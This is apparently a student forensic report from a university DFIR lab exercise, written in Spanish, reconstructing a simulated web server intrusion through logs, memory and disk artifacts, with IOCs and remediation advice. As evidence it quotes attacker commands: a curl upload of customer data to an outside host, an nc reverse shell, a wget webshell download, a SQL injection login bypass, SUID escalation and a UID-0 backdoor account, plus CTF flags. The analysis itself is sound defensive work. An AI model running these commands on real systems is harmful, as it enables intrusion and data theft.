# Informe forense — Incidente PhantomCorp (phantomcorp-web)

**Grupo:** 10  
**Investigadora:** Carolina Paula Corazza — @carocor1  
**Fecha:** 06/11/2026.
**Sistema afectado:** phantomcorp-web (10.0.0.5) · **Tipo:** intrusión + exfiltración

**Integrantes:** ver `INTEGRANTES.md`.
**Mini-research:** ver `research.md` (tema B: orden de volatilidad).

## 0. Declaración de uso de IA

Se utilizó OpenCode como apoyo para explicar la verificación de hashes y preparar el script reproducible de cadena de custodia. La investigadora verificó los hashes contra `labs/lab11-forensia/caso/evidencia.sha256`, contrastó las referencias con los artefactos originales y revisó que el script normalice CRLF a LF solo en memoria, sin modificar la evidencia. Para la revisión final de cumplimiento se volvió a contrastar el informe con el enunciado, la rúbrica y los artefactos del caso, sin alterar esta declaración.

## 1. Resumen del incidente

Los registros muestran que una IP externa enumeró el sitio y luego obtuvo respuestas exitosas en el portal de RR. HH. y en una API que permitió ejecutar comandos. El atacante descargó y usó una webshell, elevó privilegios mediante un binario SUID y dejó indicios de persistencia en un cron y una cuenta agregada. Los artefactos muestran que se preparó un archivo con datos de clientes y se intentó enviarlo a un servidor externo, aunque no confirman que el destino lo haya recibido. La memoria capturada a las 02:30 UTC muestra una conexión C2 activa en ese momento; no permite afirmar el estado actual del sistema.

## 2. Cadena de custodia

Se comparó el SHA-256 de cada archivo listado en `evidencia.sha256` con el hash registrado al preservar la evidencia. El verificador convierte CRLF a LF solo en memoria cuando detecta esos finales de línea; no escribe cambios en los archivos originales del caso.

El resultado fue **8 archivos coincidentes, 1 discrepancia y 0 archivos faltantes**. `logs/auth.log` no coincide: el manifiesto registra `0000decafbad0000f1e2d3c4b5a6978800112233445566778899aabbccddeeff`, mientras que el hash calculado tras normalizar finales de línea es `7d18039d128d0df7a245ca02f469ea02cd1d4f205a24fb33c5bcf7041b66e9ab`. Los otros ocho archivos listados coinciden con sus hashes esperados.

La discrepancia de `auth.log` es consistente con las advertencias incluidas en el propio archivo (líneas 1 y 5–7), pero el hash por sí solo no establece quién lo modificó ni cuándo. Por cadena de custodia, se conserva el archivo tal como fue recibido, se documenta la discrepancia y se trata su contenido con cautela; no se intenta repararlo ni reemplazarlo.

La ejecución reproducible está en `verificar_custodia.py` y su salida completa en `verificacion-custodia.txt`. El reporte registra hashes esperados y calculados para cada archivo. El verificador termina con código 1 cuando encuentra una discrepancia o un archivo faltante; para esta ejecución eso señala el `MISMATCH` de `logs/auth.log`, no una falla al calcular los hashes.

## 3. Línea de tiempo del ataque

Las referencias `archivo:línea` de esta sección son relativas a `labs/lab11-forensia/caso/`. Cada hora se acompaña de su tipo, porque los artefactos no miden lo mismo:

- **Hora de petición HTTP** (`logs/access.log`): corresponde al 05/09/2026 y lleva `+0000`, es decir, UTC, con precisión de segundos.
- **Hora atribuida a un archivo** (`disco/listado.txt`): precisión de minuto. El archivo no indica zona horaria; se la trata como UTC solo por una suposición razonable, apoyada en que coincide con el `access.log` (por ejemplo, `shell.php` figura a las 02:19 y su descarga se pidió a las 02:19:02), pero eso no está demostrado por el listado.
- **Momento de captura de memoria** (`memoria/pslist.txt:1`): 05/09/2026, 02:30 UTC. Marca cuándo se tomó la fotografía de la RAM, no cuándo empezó ninguno de los procesos o conexiones que contiene.
- **Historial de comandos** (`memoria/bash_history.txt`): no tiene hora por comando. Solo se conoce el orden interno del archivo, y las horas que se asocian a sus comandos son aproximadas y se marcan como tales.
- **`logs/auth.log`**: su hash no coincide con el del manifiesto (sección 2), de modo que es evidencia de integridad cuestionada. Sus horas no tienen año ni zona. Se registran, pero ningún hecho de la línea de tiempo descansa únicamente en él.

| Hora y tipo de marca | Evento reconstruido | Evidencia |
|---|---|---|
| 02:14:03 a 02:14:22 UTC (peticiones HTTP) | **Reconocimiento y enumeración.** La IP `185.220.101.42` consulta la raíz con `zgrab` y luego enumera rutas con `gobuster/3.6`: `/robots.txt` y `/portal-rrhh` responden 200, `/admin` y `/login` 404, `/backup` y `/uploads` 301. | `logs/access.log:6-12` |
| 02:16:40 a 02:17:22 UTC (peticiones HTTP) | **Ataque al login del portal.** Dos `POST` a `/portal-rrhh/login` responden 401; el tercero responde 200 y su registro incluye `user=admin'--`. Es compatible con un bypass por inyección SQL, pero el log no muestra el funcionamiento interno de la aplicación. | `logs/access.log:14-16` |
| 02:17:41 UTC (petición HTTP) | **Acceso a configuración.** `GET /backup/rrhh.conf` responde 200 (210 bytes). El contenido no forma parte del caso. | `logs/access.log:17` |
| 02:18:10 UTC (petición HTTP) | **Prueba de ejecución de comandos.** `GET /api/reporte` con `token=phantom-api-7c1e` y `cmd=id`, con respuesta 200. | `logs/access.log:18` |
| 02:18:33 UTC (petición HTTP); archivo listado a las 02:18 | **Escritura de un marcador en el servidor.** La petición lleva un `echo` codificado que escribe en `/tmp/.p`, y el listado de disco muestra ese archivo con 12 bytes, que es también el tamaño de la respuesta registrada. El timestamp del archivo tiene precisión de minuto y no fija el segundo de la ejecución. | `logs/access.log:19`; `disco/listado.txt:3` |
| 02:19:02 UTC (petición HTTP); archivo listado a las 02:19; comando sin hora | **Descarga de la webshell.** La petición ejecuta `wget` desde `45.13.37.7` hacia `/var/www/uploads/shell.php`. Cuatro fuentes apuntan al mismo hecho: el comando recuperado del historial, el proceso `sh -c wget` de `www-data` en memoria, un socket hacia el puerto 80 de `45.13.37.7` en `TIME_WAIT` asociado a `wget`, y el archivo en el disco. El contenido, defangeado, es una webshell. | `logs/access.log:20`; `memoria/bash_history.txt:4`; `memoria/pslist.txt:6`; `memoria/netstat.txt:5`; `disco/listado.txt:4`; `disco/var/www/uploads/shell.php.evidencia.txt:5-9` |
| 02:19:48 UTC (petición HTTP) | **Primer uso de la webshell.** `GET /uploads/shell.php?c=whoami` responde 200. Corrobora que el archivo plantado ejecuta comandos. | `logs/access.log:21`; `disco/var/www/uploads/shell.php.evidencia.txt:8` |
| 02:19:55 (hora registrada en log cuestionado) | `auth.log` registra un inicio de sesión SSH aceptado para `www-data` desde `185.220.101.42`. **No se toma como hecho:** ningún otro artefacto lo respalda, el `access.log` solo cubre HTTP, y el PID `1201` de esa línea coincide con el del `sh -c wget` de `pslist.txt:6`, un proceso distinto de un `sshd`. | `logs/auth.log:2` (cuestionado) |
| 02:20:31 (hora registrada en log cuestionado) | `auth.log` registra un `sudo` de `www-data` con `command not allowed`. Es un intento **denegado**; no debe describirse como una escalada lograda. | `logs/auth.log:3` (cuestionado) |
| 02:21 (archivo, precisión de minuto); 02:21:04 en log cuestionado; comandos sin hora | **Escalada de privilegios.** `/usr/local/bin/system-check` figura como copia de bash con SUID root. El historial muestra la búsqueda de binarios SUID y la ejecución de `system-check -p -c 'id'`, y la memoria lo muestra corriendo como `root` con `euid=0`. La escalada se sostiene en disco y memoria; la línea del `auth.log` es solo corroborativa. | `disco/listado.txt:5`; `memoria/bash_history.txt:5-7`; `memoria/pslist.txt:8`; `memoria/lsof.txt:4`; `logs/auth.log:4` (cuestionado) |
| 02:22 (archivo, precisión de minuto) | **Persistencia.** Aparece `/etc/cron.d/phantom-maint`, anotado como persistencia. La captura de la webshell indica que se relanza por cron cada cinco minutos. No hay evidencia de la hora de una ejecución concreta ni del contenido del cron. | `disco/listado.txt:6`; `disco/var/www/uploads/shell.php.evidencia.txt:9` |
| 02:23:15 UTC (petición HTTP); archivo listado a las 02:23 (aprox.); comandos sin hora | **Acceso a datos y preparación para exfiltrar.** La webshell lee `/app/priv/clientes.db.txt` (respuesta 200 de 48.210 bytes). Por el historial, ese archivo se comprime en `/tmp/.exfil/clientes.tar.gz` y luego se ejecuta un `curl` que lo sube a `45.13.37.7`; en memoria, la shell `bash` (PID 1240) tiene ese archivo abierto en escritura. El listado ubica el tar a las 02:23 con 48.210 bytes, igual que la respuesta. Las horas son cercanas pero no idénticas, y no prueban cuándo se transmitió nada. | `logs/access.log:22`; `memoria/bash_history.txt:8-9`; `memoria/lsof.txt:5`; `disco/listado.txt:7` |
| 02:30 UTC (momento de captura de memoria) | **Estado en la captura.** Hay una shell de `www-data`, `system-check` con `euid=0` y un `nc` hacia `45.13.37.7:4444`, con conexión `ESTABLISHED` y el mismo socket visible en `lsof`. Es consistente con una sesión de comando y control activa en ese instante, no con su hora de inicio. | `memoria/pslist.txt:1,7-9`; `memoria/netstat.txt:4`; `memoria/lsof.txt:3` |
| 02:45:00 (hora registrada en log cuestionado) | `auth.log` registra el cierre de una conexión SSH desde `185.220.101.42`. Es posterior a la captura de memoria y al último registro del `access.log` y no está corroborado. | `logs/auth.log:9` (cuestionado) |

### 3.1 Correlación entre las fuentes

La actividad de la IP atacante registrada en el `access.log` abarca nueve minutos y doce segundos, entre su primera solicitud (02:14:03) y la lectura de la base de clientes (02:23:15); la memoria muestra además que el canal de comando y control seguía activo a las 02:30. En ese tramo, el log, el disco y la memoria no se limitan a repetirse unos a otros; cada uno aporta algo que los otros no tienen:

- El **log** da el orden y la hora con precisión de segundos de las acciones que pasaron por HTTP, desde la enumeración hasta el uso de la webshell.
- El **disco** confirma los efectos que quedaron en el sistema de archivos: el marcador `/tmp/.p`, la webshell, el binario SUID, el cron y el tar con datos, todos con hora de minuto posterior al inicio del ataque (02:14).
- La **memoria** aporta lo que el log y el disco no muestran: los comandos que el atacante escribió en su shell (`bash_history.txt`), el proceso con privilegios de `root` y la conexión saliente a `45.13.37.7:4444`.

Los hechos más sólidos son los que aparecen en dos o más fuentes: la descarga de la webshell (log, historial, procesos, socket y disco), la escalada (disco, historial y memoria) y la preparación del tar (log, historial, disco y `lsof`). Los que dependen de una sola fuente, o de `auth.log`, se marcaron como tales.

### 3.2 Límites de la reconstrucción

- Las horas de los comandos del historial son aproximadas: solo se conoce su orden relativo. Por eso no se afirma que la exfiltración ocurrió a las 02:23. Esa hora es la del archivo comprimido, y el intento de subida solo figura en `bash_history.txt:9`.
- El único socket hacia el puerto 80 que muestra la memoria pertenece a `wget` (`netstat.txt:5`); ninguna captura muestra la conexión del `curl` de subida.
- `listado.txt` solo enumera archivos modificados después de las 02:14 (cabecera, líneas 1-2). Un archivo que no aparezca en él no queda por eso descartado.
- Entre las 02:21:04 y las 02:45:00, el `auth.log` contiene una nota que indica líneas eliminadas por el atacante (`auth.log:5-8`), de modo que ese intervalo está incompleto en ese archivo.
- El `access.log` incluye tráfico normal de las IP `10.0.2.x` (líneas 3-5, 13 y 23). La última de esas líneas, a las 02:31:09, es posterior a la captura de memoria; no se interpreta como indicio de nada respecto del atacante.

## 4. Indicadores de compromiso (IOCs)

El SHA-256 de `shell.php.evidencia.txt` corresponde al archivo de evidencia neutralizado, no al binario PHP original; no se atribuye ese hash al webshell desplegado.

| Tipo | Valor | Evidencia y límite |
|---|---|---|
| IP atacante | `185.220.101.42` | Aparece en el sondeo, enumeración y solicitudes del incidente (`labs/lab11-forensia/caso/logs/access.log:6-22`). Es el origen observado en esos registros; no atribuye identidad o actor. |
| C2 saliente | `45.13.37.7:4444` | La captura de memoria muestra `nc` con proceso PID 1490 y conexión `ESTABLISHED` al puerto 4444 (`labs/lab11-forensia/caso/memoria/pslist.txt:9`; `labs/lab11-forensia/caso/memoria/netstat.txt:4`). Describe el estado en la captura del 05/09/2026 a las 02:30 UTC, no el estado actual del host. |
| Webshell | `/var/www/uploads/shell.php` | El log registra el comando de descarga y luego una solicitud a la ruta (`labs/lab11-forensia/caso/logs/access.log:20-21`); el listado del disco ubica el archivo (`labs/lab11-forensia/caso/disco/listado.txt:4`) y la evidencia lo describe defangeado (`labs/lab11-forensia/caso/disco/var/www/uploads/shell.php.evidencia.txt:1-10`). No reconstruir ni ejecutar la muestra neutralizada. |
| Usuario backdoor | `phantom-svc` | Figura como usuario agregado con UID/GID 0 (`labs/lab11-forensia/caso/disco/etc/passwd.snippet:3-4`). El caso no aporta evidencia de un inicio de sesión con esa cuenta ni de que haya sido utilizada. |
| Persistencia por cron | `/etc/cron.d/phantom-maint` | El listado registra el archivo (`labs/lab11-forensia/caso/disco/listado.txt:6`) y el comentario de la webshell indica relanzamiento cada cinco minutos (`labs/lab11-forensia/caso/disco/var/www/uploads/shell.php.evidencia.txt:9`). El contenido del cron no está incluido, así que no se afirma su línea de ejecución exacta. |

## 5. Alcance del daño

A partir de los artefactos del caso, delimitamos el impacto del ataque diferenciando los hechos observados de las hipótesis técnicas y de los aspectos que no se pueden demostrar:

### 5.1 Datos comprometidos y confidencialidad

1. **Consulta al archivo de clientes por canal web:**
   - En `labs/lab11-forensia/caso/logs/access.log:22` figura la petición `GET /uploads/shell.php?c=cat%20/app/priv/clientes.db.txt HTTP/1.1` desde `185.220.101.42` a las 02:23:15 UTC. El servidor web registró una respuesta con código 200 y 48.210 bytes.
   - **Límite de la evidencia:** El registro documenta una solicitud y una respuesta HTTP 200 de 48.210 bytes hacia la IP del atacante, lo cual es compatible con una posible exposición de información. Sin embargo, este registro por sí solo no demuestra que el comando se haya ejecutado correctamente, no permite confirmar que el contenido entregado en esos bytes corresponda efectivamente al archivo solicitado, ni garantiza que el atacante los haya recibido o conservado.
2. **Acceso a variables de entorno y archivos de configuración:**
   - En `labs/lab11-forensia/caso/memoria/bash_history.txt:3` se observa el comando `cat /var/www/.env`, compatible con la lectura de secretos/configuración desde la shell; el contenido leído no está incluido en el paquete, por lo que no se puede determinar qué valores concretos quedaron expuestos.
   - En `labs/lab11-forensia/caso/logs/access.log:17` (02:17:41 UTC) hay una petición a `/backup/rrhh.conf` con respuesta 200 (210 bytes). El código 200 acredita una respuesta HTTP, pero no conocemos su contenido; como luego se usa `phantom-api-7c1e` en `access.log:18`, el archivo pudo ser una vía de obtención del token, aunque el paquete no demuestra que ese valor estuviera dentro del archivo.
3. **Preparación e intento de envío del archivo de clientes:**
   - En `labs/lab11-forensia/caso/memoria/bash_history.txt:8` el atacante ejecutó `tar czf /tmp/.exfil/clientes.tar.gz /app/priv/clientes.db.txt`. La creación de este archivo comprimido se confirma en el disco (`labs/lab11-forensia/caso/disco/listado.txt:7`, con 48.210 bytes a las 02:23) y en memoria (`labs/lab11-forensia/caso/memoria/lsof.txt:5`, con el descriptor abierto por el proceso `bash` PID 1240).
   - En `labs/lab11-forensia/caso/memoria/bash_history.txt:9` figura el intento de envío mediante `curl -s -F "f=@/tmp/.exfil/clientes.tar.gz" http://45.13.37.7/upload?tag=FLAG{dfir_c2_exfil}`.
   - **Lo que no está demostrado:** El historial documenta el comando de envío, pero no prueba que `curl` terminara con éxito ni que el servidor externo `45.13.37.7` recibiera el archivo. No disponemos de captura de paquetes (PCAP), logs del receptor ni una conexión asociada a `curl` en `labs/lab11-forensia/caso/memoria/netstat.txt`.

### 5.2 Nivel de acceso y privilegios

- El atacante ingresó inicialmente con el usuario del servidor web (`www-data`, UID 33).
- Luego escaló a `root` (EUID 0) ejecutando el binario SUID `/usr/local/bin/system-check` (`labs/lab11-forensia/caso/memoria/bash_history.txt:6`; `labs/lab11-forensia/caso/disco/listado.txt:5`; `labs/lab11-forensia/caso/memoria/pslist.txt:8`).
- Con esos privilegios inició una shell reversa conectada a `45.13.37.7:4444` (`labs/lab11-forensia/caso/memoria/pslist.txt:9`; `labs/lab11-forensia/caso/memoria/netstat.txt:4`). Esta evidencia corresponde a la captura de memoria del 05/09/2026 a las 02:30 UTC y describe ese momento histórico, no el estado actual del equipo.

### 5.3 Mecanismos de persistencia detectados

1. **Usuario backdoor:** En `labs/lab11-forensia/caso/disco/etc/passwd.snippet:4` se agregó el usuario `phantom-svc` con UID/GID 0 (privilegios de root). No hay evidencia en logs ni en procesos de que esta cuenta haya sido utilizada para iniciar sesión.
2. **Webshell:** El archivo `/var/www/uploads/shell.php` quedó alojado en el servidor (`labs/lab11-forensia/caso/disco/listado.txt:4`; `labs/lab11-forensia/caso/disco/var/www/uploads/shell.php.evidencia.txt:5-10`).
3. **Persistencia en cron:** En `labs/lab11-forensia/caso/disco/listado.txt:6` está documentada la existencia del archivo `/etc/cron.d/phantom-maint` (creado a las 02:22, 62 bytes), y un comentario dentro de la webshell (`labs/lab11-forensia/caso/disco/var/www/uploads/shell.php.evidencia.txt:9`) sugiere que se relanzaría cada 5 minutos. Sin embargo, al no disponer del contenido físico del archivo, no es posible verificar qué comando ejecutaba ni confirmar completamente su funcionamiento.

### 5.4 Limitaciones del análisis

- El archivo `labs/lab11-forensia/caso/logs/auth.log` tiene una discrepancia en su hash (`evidencia.sha256:5` vs `verificacion-custodia.txt:10`) y notas de modificación (`auth.log:5-8`), por lo que no es una fuente confiable para confirmar accesos por SSH ni ejecuciones de sudo.
- La memoria volátil es una foto fija del 05/09/2026 a las 02:30 UTC. No permite saber qué ocurrió después ni cuál es el estado del host hoy.

## 6. Contención y erradicación (recomendaciones)

Estas recomendaciones técnicas se desprenden de los artefactos analizados y no representan acciones ya ejecutadas:

### 6.1 Contención

1. **Aislar el servidor:** Aislar de la red el equipo `phantomcorp-web` (10.0.0.5), coordinando el corte con la adquisición de evidencia volátil; la captura disponible muestra un canal C2 activo (`45.13.37.7:4444`) a las 02:30 UTC.
2. **Bloquear conexiones externas:** Aplicar reglas en el firewall de borde para bloquear todo tráfico hacia y desde las IPs `185.220.101.42` y `45.13.37.7` (en particular los puertos 80 y 4444).
3. **Preservar la evidencia antes de actuar:** Tomar una imagen forense completa de disco y verificar la captura de memoria antes de reiniciar el equipo o detener procesos.
4. **Detener procesos maliciosos:** Una vez preservada la memoria y documentado el impacto del aislamiento, contener los procesos vinculados observados en la captura: PID 1490 (`nc`), PID 1477 (`system-check`), PID 1240 (`bash`) y PID 1201 (`sh`). Los PID son los de la fotografía histórica y se deben volver a identificar en el sistema antes de actuar; no asumir que siguen siendo los mismos.

### 6.2 Erradicación

1. **Eliminar mecanismos de persistencia y archivos del ataque:**
   - Dar de baja la cuenta no autorizada `phantom-svc` en `/etc/passwd`.
   - Borrar la tarea programada `/etc/cron.d/phantom-maint`.
   - Eliminar la webshell `/var/www/uploads/shell.php`.
   - Retirar y reemplazar el binario SUID no confiable `/usr/local/bin/system-check` desde una fuente limpia.
   - Limpiar los archivos temporales creados por el atacante: `/tmp/.exfil/clientes.tar.gz` y `/tmp/.p`.
2. **Rotar credenciales y secretos expuestos:**
   - Revocar el token `phantom-api-7c1e` usado en `/api/reporte`.
   - Rotar las contraseñas y claves de bases de datos expuestas en `/var/www/.env` y en `/backup/rrhh.conf`.
   - Cambiar las credenciales del portal de RR. HH. (usuario `admin`).
3. **Corregir las vulnerabilidades explotadas:**
   - Corregir el formulario `/portal-rrhh/login` implementando consultas preparadas (Prepared Statements) para evitar la inyección SQL.
   - Modificar `/api/reporte` eliminando la ejecución directa de comandos en el sistema a través del parámetro `cmd`.
   - Configurar el servidor web para deshabilitar la ejecución de PHP en `/uploads` y restringir el acceso al directorio `/backup`.

### 6.3 Recuperación

- **Reconstrucción desde una imagen limpia:** Como el atacante obtuvo privilegios de `root` y pudo haber modificado binarios o configuraciones sin dejar registro íntegro, no es recomendable limitarse a limpiar archivos a mano. Lo técnicamente adecuado es reinstalar el servidor desde una imagen base confiable y restaurar los datos desde un respaldo previo al ataque (anterior al 05/09/2026 02:14 UTC).

## 7. Preguntas de análisis

> Nota: algunos artefactos incluyen marcadores `FLAG{...}` que son flags de los retos y se citan como evidencia forense. El estado general de los retos se documenta en `ctf-status-11.txt`.

### P1 — Orden de volatilidad

La memoria se captura antes que el disco por el orden de volatilidad: lo que se pierde primero se preserva primero, según el enunciado del laboratorio. La RAM no sobrevive a un apagado o reinicio, mientras que el disco persiste, de modo que cualquier acción previa a la captura, incluso apagar el equipo, puede destruir información que nunca estuvo en el disco.

En este caso, la memoria conserva al menos tres elementos que el disco ya no tiene o nunca tuvo:

1. **El historial de comandos.** El encabezado de `memoria/bash_history.txt:1` indica que fue recuperado de memoria y que «el del disco fue borrado por el atacante»; además, el último comando registrado es `history -c` (línea 10). Gracias a la copia en RAM se pueden leer la descarga de la webshell, la búsqueda de binarios SUID, la creación del tar y el comando `curl` de intento de envío (líneas 4 y 5-9).
2. **Los procesos en ejecución.** `memoria/pslist.txt:7-9` muestra la shell del atacante, `system-check` con `euid=0` y `nc 45.13.37.7 4444`. El disco solo muestra el binario `system-check` en `listado.txt:5`; no muestra que estuviera ejecutándose ni quién lo hacía.
3. **La conexión de red.** `memoria/netstat.txt:4` registra el socket `ESTABLISHED` desde `10.0.0.5:41022` hacia `45.13.37.7:4444`, asociado al PID 1490 (`nc`). Una conexión activa desaparece al reiniciar, y ninguno de los artefactos de disco del caso la describe.

Lo que este paquete muestra es qué contenía la RAM en el momento de la captura (02:30 UTC, `pslist.txt:1`). No documenta en qué orden se adquirió cada evidencia, por lo que no se usa para demostrar la secuencia real de la adquisición; esa conclusión descansa en el principio general de volatilidad. Sin embargo, el caso ilustra bien su consecuencia práctica: si el equipo se hubiera apagado antes de la captura, el historial recuperado, la shell, el proceso con privilegios y el canal de comando y control no habrían quedado disponibles para el análisis.

### P2 — Integridad de la evidencia

Comparé el SHA-256 de `logs/auth.log` con el valor registrado para ese archivo en `evidencia.sha256`. El hash calculado, `7d18039d128d0df7a245ca02f469ea02cd1d4f205a24fb33c5bcf7041b66e9ab`, no coincide con el valor del manifiesto (`0000decafbad0000f1e2d3c4b5a6978800112233445566778899aabbccddeeff`). Esa discrepancia indica que el archivo recibido no coincide con la versión cuya huella figura en la custodia. Por eso conservé el archivo sin modificarlo y documenté la diferencia. Si no se registra, no es posible confiar en su integridad ni distinguir con claridad qué contenido pertenece a la evidencia preservada. El hash detecta una diferencia, pero no identifica por sí solo quién la causó ni cuándo. La comprobación está documentada en `verificacion-custodia.txt`.

### P3 — Correlación de artefactos

El evento es la descarga y despliegue de la webshell. El `access.log` registra la solicitud a las **02:19:02 UTC** (`labs/lab11-forensia/caso/logs/access.log:20`); el `listado.txt` ubica el archivo `/var/www/uploads/shell.php` a las **02:19**, con precisión de minuto y sin zona horaria indicada (`labs/lab11-forensia/caso/disco/listado.txt:4`); y `bash_history.txt:4` conserva el comando `wget` correspondiente, aunque sin hora individual. Las tres fuentes convergen en el mismo evento alrededor de las 02:19, pero no tienen timestamps idénticos: no es posible atribuir al comando de historial una hora exacta ni elevar la marca de minuto del disco a precisión de segundos.

### P4 — Recuperación del historial

El comando `history -c` borra la lista del historial de comandos de la sesión de Bash, pero no elimina automáticamente otras copias que ya existan. En este caso, el encabezado de `memoria/bash_history.txt:1` indica que el historial fue recuperado desde memoria, aunque el atacante ejecutó `history -c` (`memoria/bash_history.txt:10`). Por eso se pudieron recuperar comandos como la descarga del webshell y la preparación del archivo para exfiltración (`memoria/bash_history.txt:4,8-9`). La evidencia demuestra que esos comandos estaban en el historial recuperado de memoria; no permite afirmar más sobre el mecanismo exacto de recuperación.

### P5 — Relación entre técnicas ofensivas y evidencia forense

Un investigador forense necesita entender cómo opera un atacante para saber qué rastros buscar y cómo conectar eventos dispersos entre logs, memoria y disco. En este caso, las técnicas utilizadas se relacionan con las evidencias de la siguiente manera:

1. **Acceso y reconocimiento inicial:**
   - *Técnica:* Reconocimiento inicial y enumeración de directorios web.
   - *Evidencia:* En `labs/lab11-forensia/caso/logs/access.log:6`, la IP `185.220.101.42` consultó la raíz del sitio a las 02:14:03 UTC usando `zgrab/0.x`. Luego, entre las 02:14:19 y 02:14:22 UTC (`access.log:7-12`), utilizó `gobuster/3.6` para enumerar rutas como `/robots.txt`, `/admin`, `/login`, `/backup`, `/portal-rrhh` y `/uploads`.
2. **Explotación de vulnerabilidades (SQLi y RCE):**
   - *Técnica:* Inyección de sentencias SQL para alterar la autenticación y ejecución de comandos a través de parámetros no sanitizados.
   - *Evidencias:*
     - **SQL Injection:** En `labs/lab11-forensia/caso/logs/access.log:14-16`, tras dos intentos fallidos con código 401, el atacante envió una petición con `user=admin'--` a `/portal-rrhh/login` recibiendo código HTTP 200 (180 bytes). Un código 200 por sí solo no garantiza que la autenticación haya sido superada, pero la secuencia temporal y el uso del payload de SQLi sostienen la hipótesis de un bypass de login en ese portal.
     - **RCE:** En `labs/lab11-forensia/caso/logs/access.log:18-20` se registraron consultas a `/api/reporte?token=phantom-api-7c1e&cmd=...` con comandos como `id`, `echo` y `wget`. La petición `echo` deja el marcador del reto en `logs/access.log:19` y un archivo de 12 bytes en `/tmp/.p` (`disco/listado.txt:3`); la petición `wget` también aparece como proceso `sh -c wget ...` (PID 1201) en memoria (`memoria/pslist.txt:6`).
3. **Uso de webshell:**
   - *Técnica:* Subida de un script para mantener ejecución remota de comandos por HTTP.
   - *Evidencia:* La descarga se solicitó vía RCE (`access.log:20`) y el archivo se confirmó en `labs/lab11-forensia/caso/disco/listado.txt:4` (`/var/www/uploads/shell.php`, creado a las 02:19). Su contenido neutralizado en `labs/lab11-forensia/caso/disco/var/www/uploads/shell.php.evidencia.txt:8` muestra la ejecución mediante `sys'tem($_GET['c'])`, y en `labs/lab11-forensia/caso/logs/access.log:21-22` figuran las peticiones invocando comandos con el parámetro `?c=`.
4. **Escalada de privilegios mediante binario SUID:**
   - *Técnica:* Búsqueda y abuso de binarios con permisos de superusuario para pasar de `www-data` a `root`.
   - *Evidencia:* En `labs/lab11-forensia/caso/memoria/bash_history.txt:5-6` figuran los comandos `find / -perm -4000` y `/usr/local/bin/system-check -p -c 'id'`. En el disco, `labs/lab11-forensia/caso/disco/listado.txt:5` muestra el binario SUID `/usr/local/bin/system-check` creado a las 02:21, y en memoria (`labs/lab11-forensia/caso/memoria/pslist.txt:8`) se identifica el proceso PID 1477 corriendo con `euid=0`. *(En `logs/auth.log:3-4` aparecen registros consistentes con este intento, pero con confiabilidad limitada por su discrepancia de hash).*
5. **Establecimiento de comunicación con el servidor externo (C2):**
   - *Técnica:* Apertura de una conexión de red saliente (reverse shell) para evadir bloqueos perimetrales de tráfico entrante.
   - *Evidencia:* En la captura de memoria de las 02:30 UTC se observa el proceso PID 1490 ejecutando `nc 45.13.37.7 4444` como root (`labs/lab11-forensia/caso/memoria/pslist.txt:9`), con un socket saliente en estado `ESTABLISHED` en `labs/lab11-forensia/caso/memoria/netstat.txt:4` y descriptor abierto en `labs/lab11-forensia/caso/memoria/lsof.txt:3`.
6. **Intento de empaquetado y transferencia de información:**
   - *Técnica:* Compresión de archivos sensibles y posterior intento de transmisión hacia el servidor del atacante.
   - *Evidencia y límites:* En `labs/lab11-forensia/caso/memoria/bash_history.txt:8` figura el empaquetado con `tar czf /tmp/.exfil/clientes.tar.gz /app/priv/clientes.db.txt`, corroborado por la presencia del archivo de 48.210 bytes en `labs/lab11-forensia/caso/disco/listado.txt:7` y el descriptor de escritura en `labs/lab11-forensia/caso/memoria/lsof.txt:5`. El intento de envío aparece en `labs/lab11-forensia/caso/memoria/bash_history.txt:9` con el comando `curl -s -F "f=@/tmp/.exfil/clientes.tar.gz" http://45.13.37.7/upload?tag=FLAG{dfir_c2_exfil}`. Se aclara que existe constancia del intento de ejecución del comando `curl`, pero no hay evidencia que demuestre que el servidor remoto haya recibido los datos.
7. **Persistencia mediante los mecanismos identificados:**
   - *Técnica:* Creación de puntos de reingreso para conservar el acceso al sistema.
   - *Evidencia:* Creación del usuario con UID 0 `phantom-svc:x:0:0:service::/root:/bin/bash` (`labs/lab11-forensia/caso/disco/etc/passwd.snippet:4`), existencia documentada de `/etc/cron.d/phantom-maint` (`labs/lab11-forensia/caso/disco/listado.txt:6`, referenciado en `disco/var/www/uploads/shell.php.evidencia.txt:9` aunque sin contenido disponible para confirmar su comando exacto), y presencia continua de la webshell en `/var/www/uploads/shell.php` (`labs/lab11-forensia/caso/disco/listado.txt:4`).
